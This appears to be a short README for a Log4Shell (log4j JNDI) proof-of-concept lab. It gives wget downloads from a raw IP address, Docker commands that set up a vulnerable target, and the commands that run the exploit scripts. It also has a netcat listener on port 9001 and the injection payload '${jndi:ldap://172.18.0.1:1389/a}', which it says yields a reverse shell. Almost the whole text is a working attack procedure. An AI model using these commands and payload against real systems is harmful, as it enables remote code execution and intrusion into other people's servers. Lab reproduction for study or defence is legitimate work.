# 3204


download jar file 

wget http://18.183.210.2/download/jdk-8u20-linux-x64.tar.gz


wget http://18.183.210.2/download/marshalsec-0.0.3-SNAPSHOT-all.jar

put marshalsec-0.0.3-SNAPSHOT-all.jar in target folder 

extract java file and ensure in same directory as poc.py or exploit wont work

#Run with docker composer 
sudo docker-compose build 
sudo docker-compose up -d 


#Run without docker composer
docker network create --subnet=172.18.0.0/16 companyABC

sudo docker run --net companyABC--ip 172.18.0.22 log4j-shell-poc 



run exploit
./pwn.py --target http://localhost:8080(ip of target) --exploit-host 127.0.0.1 (ip of machine/docker of listener) 
start nc listener at 9001

python3 poc.py --userip 172.18.0.1 --webport 8000 --lport 9001
copy the copy this in the output
 ${jndi:ldap://172.18.0.1:1389/a}

u will then get reverse shell

